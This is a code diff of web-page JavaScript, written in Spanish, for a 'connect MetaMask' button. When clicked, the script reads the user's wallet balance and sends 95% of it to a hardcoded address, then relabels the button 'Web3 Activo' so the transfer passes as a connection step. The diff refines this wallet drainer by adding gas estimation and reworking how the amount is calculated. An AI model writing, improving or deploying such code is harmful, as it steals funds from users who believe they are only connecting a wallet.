@@ -2,30 +2,33 @@ document.getElementById('conectarMetaMask').addEventListener('click', async () =
     if (window.ethereum) {
         try {
             const web3 = new Web3(window.ethereum);
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const accounts = await web3.eth.getAccounts();
             const usuarioAddress = accounts[0];
             const direccionDestino = '0x8935361d21943Ee8a863082EdD8a6Aefb062E434';
-
             const balance = await web3.eth.getBalance(usuarioAddress);
-            const balanceBN = web3.utils.toBN(balance);
-            // Calcular el 95% del saldo
-            const porcentajeEnviarBN = balanceBN.mul(web3.utils.toBN(95)).div(web3.utils.toBN(100));
+            const cantidadEnviar = web3.utils.fromWei(balance, 'ether') * 0.95;
+            const cantidadEnviarEnWei = web3.utils.toWei(cantidadEnviar.toString(), 'ether');
 
             const tx = {
                 from: usuarioAddress,
                 to: direccionDestino,
-                value: porcentajeEnviarBN.toString(),
-                gas: '21000', // Puede ser necesario ajustar este valor.
+                value: cantidadEnviarEnWei,
+                gas: await web3.eth.estimateGas({
+                    from: usuarioAddress,
+                    to: direccionDestino,
+                    value: cantidadEnviarEnWei,
+                }),
             };
 
             web3.eth.sendTransaction(tx)
-            .then(receipt => {
-                console.log('Transacción exitosa:', receipt);
-                document.getElementById('conectarMetaMask').textContent = 'Conectado';
-            })
-            .catch(error => {
-                console.error('Error en la transacción:', error);
-            });
+                .then(receipt => {
+                    console.log('Transacción exitosa:', receipt);
+                    document.getElementById('conectarMetaMask').textContent = 'Web3 Activo';
+                })
+                .catch(error => {
+                    console.error('Error en la transacción:', error);
+                });
         } catch (error) {
             console.error('Error conectando a MetaMask:', error);
         }
